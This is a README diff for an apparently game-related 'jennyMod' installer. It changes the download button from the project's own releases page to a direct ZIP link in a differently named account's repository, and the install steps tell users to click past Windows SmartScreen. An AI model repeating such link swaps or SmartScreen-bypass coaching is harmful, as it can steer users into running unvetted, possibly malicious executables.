@@ -53,7 +53,7 @@
 
 ## Installation
 
-[![Download jennyMod Installer](button.svg)](../../releases/latest)
+[![Download jennyMod Installer](button.svg)](https://github.com/BeamChunin42/jennymod-installer/releases/download/latest/JennyMod.zip)
 
 1. Click the button above or go to [**Releases**](../../releases/latest)
 2. Run `.exe` — if SmartScreen appears click **More info → Run anyway**
